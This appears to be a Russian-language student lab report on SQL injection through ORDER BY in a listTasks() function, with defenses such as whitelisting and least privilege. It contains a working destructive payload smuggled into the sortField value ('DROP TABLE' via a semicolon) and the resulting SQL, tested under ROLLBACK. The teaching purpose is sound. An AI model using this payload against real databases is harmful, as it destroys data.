# Атака на listTasks() — DROP TABLE через ORDER BY (Этап 2.3)

## Уязвимый код

`code/03_sort_vulnerable.js` — конкатенация sortField и sortDirection в ORDER BY. Параметризация ($1) **не помогает**: PostgreSQL не разрешает передавать имя столбца как параметр (см. Лекцию 9, раздел 2.5 — «Параметры нельзя использовать для SQL-идентификаторов напрямую»).

## Вредоносный ввод

```text
sortField     = title; DROP TABLE injection_lab.tasks; --
sortDirection = ASC
```

## Итоговый SQL

```sql
SELECT task_id, title, priority, created_at
FROM injection_lab.tasks
ORDER BY title; DROP TABLE injection_lab.tasks; --  ASC
```

Точка с запятой превращает один «запрос» в **два statement'а**: безобидный SELECT и разрушительный DROP. Остаток после `--` (включая `ASC`) комментируется.

## Прогон в транзакции с ROLLBACK

| Шаг | Результат |
|---|---|
| До атаки: `COUNT(*)` | 4 строки |
| `BEGIN` + SELECT + DROP | SELECT отработал и вернул 4 строки; DROP TABLE **успешно** удалил таблицу |
| Проверка внутри транзакции | `ERROR: relation "injection_lab.tasks" does not exist` |
| `ROLLBACK` | таблица возвращена |
| После ROLLBACK: `COUNT(*)` | 4 строки |

## Выводы

- DROP TABLE сработал бы в проде без транзакции. Это **разрушение доступности данных** в чистом виде (Лекция 9, раздел 3).
- Параметризация для имён столбцов не работает — нужен **белый список** допустимых значений (раздел 5.3).
- Дополнительный слой защиты — минимальные привилегии роли приложения (см. defense_in_depth.md, Этап 5). Под web_app_demo тот же DROP упал бы на permission denied.

## Цитата

Лекция 9, раздел 2.5: «Многие разработчики знают, что опасно вставлять значения в WHERE, но забывают о других частях запроса. Особенно коварны динамические имена столбцов, порядок сортировки и имена таблиц».
